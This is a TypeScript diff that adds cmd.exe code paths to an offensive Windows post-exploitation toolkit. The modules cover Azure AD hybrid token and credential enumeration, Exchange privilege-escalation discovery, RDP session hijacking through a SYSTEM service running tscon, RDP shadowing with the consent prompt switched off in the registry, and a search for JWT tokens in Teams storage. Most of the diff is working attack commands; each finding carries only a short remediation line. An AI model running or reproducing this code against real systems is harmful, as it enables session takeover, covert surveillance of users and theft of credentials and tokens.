@@ -1,4 +1,4 @@
-import { ps, argVal, hasFlag } from "./shared"
+import { ps, cmd, wmic, activeExec, argVal, hasFlag } from "./shared"
 import type { Finding, HookResult } from "./shared"
 
 export async function azureAdHybrid(args: string[], timeout: number): Promise<HookResult> {
@@ -7,6 +7,64 @@ export async function azureAdHybrid(args: string[], timeout: number): Promise<Ho
   const refreshToken = argVal(args, "--refresh-token")
   const findings: Finding[] = []
   const output: string[] = ["[*] Azure AD / Entra ID hybrid attack toolkit...\n"]
+
+  if (activeExec === "cmd" || activeExec === "bat") {
+    if (action === "enum") {
+      const r = await cmd(`dsregcmd /status & echo. & cmdkey /list & echo. & sc query ADSync 2>nul & reg query "HKLM\\SOFTWARE\\Microsoft\\Azure AD Connect" /s 2>nul & dir /b "%LOCALAPPDATA%\\Microsoft\\TokenBroker\\Cache\\*.tbres" 2>nul & reg query "HKLM\\SOFTWARE\\Microsoft\\Enrollments" /s 2>nul | findstr /i "UPN Provider" 2>nul`, timeout)
+      output.push(r.stdout)
+      if (r.stdout.includes("AzureAdJoined : YES") || r.stdout.includes("ADSync")) {
+        findings.push({
+          checkId: "AZURE-001",
+          provider: "winhook",
+          severity: "high",
+          status: "FAIL",
+          resource: "Azure AD Hybrid",
+          title: "Azure AD hybrid environment detected — enumeration complete",
+          details: r.stdout.substring(0, 500),
+          remediation: "Restrict access to Azure AD Connect server. Enable Credential Guard.",
+        })
+      }
+    }
+    if (action === "prt") {
+      const r = await cmd(`dsregcmd /status | findstr /i "AzureAdPrt NgcSet CloudTGT RefreshToken" & echo. & dir /b "%LOCALAPPDATA%\\Microsoft\\TokenBroker\\Cache\\*.tbres" 2>nul & echo. & dir /b "%USERPROFILE%\\.azure\\msal_token_cache.json" 2>nul`, timeout)
+      output.push(r.stdout)
+      output.push("[*] PRT extraction requires BrowserCore.exe or DPAPI — use --exec ps for full extraction")
+      output.push("[*] Token Broker cache files are DPAPI-encrypted")
+    }
+    if (action === "connect-creds") {
+      const r = await cmd(`sc query ADSync 2>nul & reg query "HKLM\\SOFTWARE\\Microsoft\\Azure AD Connect" /s 2>nul & net user /domain | findstr /i "MSOL_" 2>nul`, timeout)
+      output.push(r.stdout)
+      if (r.stdout.includes("ADSync")) {
+        output.push("[*] AAD Connect found — credential extraction requires SQL query (ADSync DB)")
+        output.push("[*] Use --exec ps or: Install-Module AADInternals; Get-AADIntSyncCredentials")
+      }
+    }
+    if (action === "sso-key") {
+      const r = await cmd(`dsquery * -filter "(sAMAccountName=AZUREADSSOACC$)" -attr sAMAccountName pwdLastSet servicePrincipalName whenCreated 2>nul & nltest /dsgetdc:%USERDNSDOMAIN% 2>nul`, timeout)
+      output.push(r.stdout)
+      if (r.stdout.includes("AZUREADSSOACC")) {
+        findings.push({
+          checkId: "AZURE-006",
+          provider: "winhook",
+          severity: "critical",
+          status: "FAIL",
+          resource: "AZUREADSSOACC$",
+          title: "Seamless SSO computer account found — key extraction possible",
+          details: "AZUREADSSOACC$ password hash can forge Kerberos tickets for any Azure AD user",
+          remediation: "Rotate AZUREADSSOACC$ password every 30 days, restrict DCSync permissions.",
+        })
+        output.push("[*] Extract key via: winhook dcsync --target AZUREADSSOACC$")
+      }
+    }
+    if (action === "token") {
+      if (!refreshToken) {
+        output.push("ERROR: --refresh-token required for token action")
+        output.push("Extract refresh tokens first: winhook azure_ad_hybrid --action prt")
+      }
+      output.push("[!] Token exchange requires HTTP POST to login.microsoftonline.com — use --exec ps or curl")
+    }
+    return { output: output.join("\n"), findings }
+  }
 
   if (action === "enum") {
     const script = `
@@ -417,6 +475,54 @@ export async function exchangeAbuse(args: string[], timeout: number): Promise<Ho
   const findings: Finding[] = []
   const output: string[] = ["[*] Exchange Server exploitation...\n"]
 
+  if (activeExec === "cmd" || activeExec === "bat") {
+    if (action === "enum") {
+      const r = await cmd(`dsquery * -filter "(objectCategory=msExchExchangeServer)" -attr cn serialNumber networkAddress msExchCurrentServerRoles -limit 0 2>nul & echo. & dsquery * -filter "(&(objectCategory=group)(cn=Exchange Windows Permissions))" -attr member -limit 0 2>nul`, timeout)
+      output.push(r.stdout || "[*] No Exchange servers found via dsquery")
+      if (r.stdout && r.stdout.includes("cn")) {
+        findings.push({
+          checkId: "EXCH-001",
+          provider: "winhook",
+          severity: "medium",
+          status: "INFO",
+          resource: "Exchange",
+          title: "On-premises Exchange infrastructure discovered via dsquery",
+          details: r.stdout.substring(0, 500),
+          remediation: "Ensure Exchange servers are patched and hardened.",
+        })
+      }
+    }
+    if (action === "gal") {
+      const r = await cmd(`dsquery * -filter "(&(objectCategory=person)(objectClass=user)(mail=*))" -attr sAMAccountName mail displayName title department -limit 0 2>nul`, timeout)
+      output.push(r.stdout || "[*] GAL dump requires LDAP — dsquery may have limited output")
+    }
+    if (action === "search") {
+      output.push("[!] Mailbox search requires EWS API or Outlook COM — not available via cmd.exe")
+      output.push("[*] Use --exec ps for Exchange Web Services search")
+    }
+    if (action === "transport-rule") {
+      output.push("[!] Transport rule creation requires Exchange Management Shell — not available via cmd.exe")
+      output.push("[*] Run on Exchange server: Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn")
+    }
+    if (action === "privesc") {
+      const r = await cmd(`dsquery * -filter "(&(objectCategory=group)(cn=Exchange Windows Permissions))" -attr member -limit 0 2>nul & echo. & dsquery * -filter "(&(objectCategory=group)(cn=Exchange Trusted Subsystem))" -attr member -limit 0 2>nul`, timeout)
+      output.push(r.stdout || "[*] Exchange security groups not found")
+      if (r.stdout && r.stdout.includes("member")) {
+        findings.push({
+          checkId: "EXCH-003",
+          provider: "winhook",
+          severity: "critical",
+          status: "FAIL",
+          resource: "Exchange Permissions",
+          title: "Exchange has WriteDACL on domain — privesc to domain admin possible",
+          details: "Exchange Windows Permissions group members can grant DCSync rights on the domain object",
+          remediation: "Remove unnecessary permissions from Exchange security groups, apply Split Permissions model.",
+        })
+      }
+    }
+    return { output: output.join("\n"), findings }
+  }
+
   if (action === "enum") {
     const script = `
 Write-Output "=== Exchange Server Enumeration ==="
@@ -748,6 +854,46 @@ export async function rdpHijack(args: string[], timeout: number): Promise<HookRe
   const findings: Finding[] = []
   const output: string[] = ["[*] RDP Session Hijacking...\n"]
 
+  if (activeExec === "cmd" || activeExec === "bat") {
+    if (action === "enum") {
+      const r = await cmd("query user 2>nul || qwinsta 2>nul", timeout)
+      output.push(r.stdout || "[*] No sessions found")
+      const whoami = await cmd("whoami /user | findstr /i S-1-5-18", timeout)
+      output.push(whoami.stdout.includes("S-1-5-18") ? "[+] Running as SYSTEM — credential-less hijack possible" : "[*] Not running as SYSTEM — use token_impersonate or potato_attack first")
+      const discCount = (r.stdout.match(/Disc/gi) || []).length
+      if (discCount > 0) {
+        findings.push({
+          checkId: "WIN-RDP-001",
+          provider: "windows",
+          severity: "high",
+          status: "ENUMERATED",
+          resource: "rdp://sessions",
+          title: `${discCount} disconnected RDP sessions available for hijacking`,
+          details: "Disconnected RDP sessions can be hijacked as SYSTEM without credentials using tscon.exe",
+          remediation: "Set GPO to log off disconnected sessions after timeout. Disable Remote Desktop if not needed.",
+        })
+      }
+    } else {
+      if (!sessionId) return { output: "[!] Required: --session SESSION_ID", findings }
+      const r = await cmd(`tscon ${sessionId} /dest:console 2>nul || (sc create csRdpHijack binPath= "cmd.exe /c tscon ${sessionId} /dest:console" start= demand type= own error= ignore >nul 2>&1 & sc start csRdpHijack >nul 2>&1 & timeout /t 2 >nul & sc delete csRdpHijack >nul 2>&1)`, timeout)
+      output.push(r.stdout)
+      output.push(`[+] Session ${sessionId} hijack attempted`)
+      const after = await cmd("query user 2>nul", timeout)
+      output.push(after.stdout)
+      findings.push({
+        checkId: "WIN-RDP-002",
+        provider: "windows",
+        severity: "critical",
+        status: "EXPLOITED",
+        resource: `rdp://session/${sessionId}`,
+        title: `RDP session ${sessionId} hijacked via tscon.exe`,
+        details: "Session taken over via tscon.exe executed as SYSTEM",
+        remediation: "Monitor Event ID 4778 (session reconnected). Set logoff timeout for disconnected sessions.",
+      })
+    }
+    return { output: output.join("\n"), findings }
+  }
+
   if (action === "enum") {
     const script = `
 Write-Output "[*] Enumerating RDP sessions..."
@@ -856,6 +1002,71 @@ export async function rdpShadow(args: string[], timeout: number): Promise<HookRe
   const control = hasFlag(args, "--control")
   const findings: Finding[] = []
   const output: string[] = ["[*] RDP session shadowing operations...\n"]
+
+  if (activeExec === "cmd" || activeExec === "bat") {
+    if (action === "enum") {
+      const r = await cmd("query user 2>nul || qwinsta 2>nul", timeout)
+      output.push(r.stdout)
+      const shadowCfg = await cmd(`reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v AllowRemoteRPC 2>nul & reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services" /v Shadow 2>nul & reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp" /v UserAuthentication 2>nul`, timeout)
+      output.push(shadowCfg.stdout)
+      const activeCount = (r.stdout.match(/Active/gi) || []).length
+      if (activeCount > 0) {
+        findings.push({
+          checkId: "WIN-RDP-001",
+          provider: "windows",
+          severity: "high",
+          status: "SHADOWABLE",
+          resource: "rdp://sessions",
+          title: `${activeCount} active RDP sessions available for shadowing`,
+          details: "Active sessions can be shadowed for real-time credential observation.",
+          remediation: "Set GPO 'Set rules for remote control of RDS sessions' to Disabled.",
+        })
+      }
+      if (shadowCfg.stdout.includes("0x2") || shadowCfg.stdout.includes("0x4")) {
+        findings.push({
+          checkId: "WIN-RDP-002",
+          provider: "windows",
+          severity: "critical",
+          status: "NO_CONSENT",
+          resource: "rdp://shadow-policy",
+          title: "RDP shadow allowed WITHOUT user consent",
+          details: "Shadow policy permits silent session observation without consent prompt.",
+          remediation: "Set shadow policy to require user permission (mode 1 or 3).",
+        })
+      }
+    }
+    if (action === "shadow") {
+      if (!sessionId) {
+        output.push("ERROR: --session-id required (use --action enum to list sessions)")
+        return { output: output.join("\n"), findings }
+      }
+      const shadowFlag = control ? "/control" : ""
+      const consentFlag = noConsent ? "/noConsentPrompt" : ""
+      if (noConsent) {
+        await cmd(`reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f 2>nul`, timeout)
+      }
+      const r = await cmd(`start mstsc /shadow:${sessionId} ${shadowFlag} ${consentFlag}`, timeout)
+      output.push(r.stdout)
+      output.push(`[+] Shadow session launched for session ${sessionId}`)
+      findings.push({
+        checkId: "WIN-RDP-010",
+        provider: "windows",
+        severity: "critical",
+        status: "SHADOWING",
+        resource: `rdp://session/${sessionId}`,
+        title: `RDP session ${sessionId} is being shadowed`,
+        details: `${control ? "Full control" : "View only"} shadow active. ${noConsent ? "No consent prompt." : "User may see consent."}`,
+        remediation: "Disconnect shadow with Ctrl+*. Restore policy if modified.",
+      })
+    }
+    if (action === "config") {
+      const r = await cmd(`reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v AllowRemoteRPC /t REG_DWORD /d 1 /f & reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f`, timeout)
+      output.push(r.stdout)
+      output.push("[+] AllowRemoteRPC=1, Shadow=2 (Full Control without consent)")
+      output.push("[*] Cleanup: reg delete ... /v Shadow /f & reg add ... /v AllowRemoteRPC /d 0 /f")
+    }
+    return { output: output.join("\n"), findings }
+  }
 
   if (action === "enum") {
     const script = `
@@ -1066,6 +1277,48 @@ export async function teamsToken(args: string[], timeout: number): Promise<HookR
   const action = argVal(args, "--action") || "enum"
   const findings: Finding[] = []
   const output: string[] = ["[*] Microsoft Teams token and data extraction...\n"]
+
+  if (activeExec === "cmd" || activeExec === "bat") {
+    if (action === "enum" || action === "full") {
+      const r = await cmd(`tasklist /fi "imagename eq Teams.exe" /fo csv 2>nul & tasklist /fi "imagename eq ms-teams.exe" /fo csv 2>nul & echo. & if exist "%APPDATA%\\Microsoft\\Teams\\current" (echo [+] Teams Classic found: %APPDATA%\\Microsoft\\Teams) else (echo [-] Teams Classic not found) & if exist "%LOCALAPPDATA%\\Packages\\MSTeams_8wekyb3d8bbwe" (echo [+] Teams New MSIX found) & echo. & dir /b "%APPDATA%\\Microsoft\\Teams\\Cookies" 2>nul & dir /b "%APPDATA%\\Microsoft\\Teams\\Local Storage\\leveldb\\*.ldb" 2>nul & dir /b "%LOCALAPPDATA%\\Microsoft\\TokenBroker\\Cache\\*.tbres" 2>nul`, timeout)
+      output.push(r.stdout)
+      findings.push({
+        checkId: "WIN-HYBRID-010",
+        provider: "windows",
+        severity: r.stdout.includes("Teams.exe") || r.stdout.includes("ms-teams.exe") ? "high" : "medium",
+        status: "ENUMERATED",
+        resource: "teams://enum",
+        title: "Microsoft Teams installation and data storage discovery",
+        details: r.stdout.substring(0, 500),
+        remediation: "Use Teams New (WebView2 + Token Broker). Enable MAM policies.",
+      })
+    }
+    if (action === "tokens" || action === "full") {
+      output.push("[!] Teams token extraction from LevelDB requires binary parsing — limited via cmd.exe")
+      const r = await cmd(`dir /b /s "%APPDATA%\\Microsoft\\Teams\\Local Storage\\leveldb\\*.ldb" 2>nul & echo. & dir /b "%LOCALAPPDATA%\\Microsoft\\TokenBroker\\Cache\\*.tbres" 2>nul & echo. & findstr /s /m "eyJ" "%APPDATA%\\Microsoft\\Teams\\Local Storage\\leveldb\\*.ldb" 2>nul`, timeout)
+      output.push(r.stdout)
+      if (r.stdout.includes("eyJ")) {
+        output.push("[+] JWT tokens detected in LevelDB files")
+        output.push("[*] Use --exec ps for full token parsing and validation")
+      }
+      output.push("[*] Token Broker tokens are DPAPI-encrypted — use dpapi_extract to decrypt")
+    }
+    if (action === "chats" || action === "full") {
+      const r = await cmd(`dir /b /s "%APPDATA%\\Microsoft\\Teams\\IndexedDB" 2>nul & echo. & dir /b "%USERPROFILE%\\Downloads\\Microsoft Teams Chat Files\\*" 2>nul & echo. & dir /b /s "%APPDATA%\\Microsoft\\Teams\\Service Worker\\CacheStorage" 2>nul | find /c /v "" 2>nul`, timeout)
+      output.push(r.stdout)
+      findings.push({
+        checkId: "WIN-HYBRID-012",
+        provider: "windows",
+        severity: "medium",
+        status: "ENUMERATED",
+        resource: "teams://chats",
+        title: "Microsoft Teams chat history and cached data locations identified",
+        details: r.stdout.substring(0, 500),
+        remediation: "Enable Teams DLP policies. Restrict file downloads.",
+      })
+    }
+    return { output: output.join("\n"), findings }
+  }
 
   if (action === "enum" || action === "full") {
     const script = `
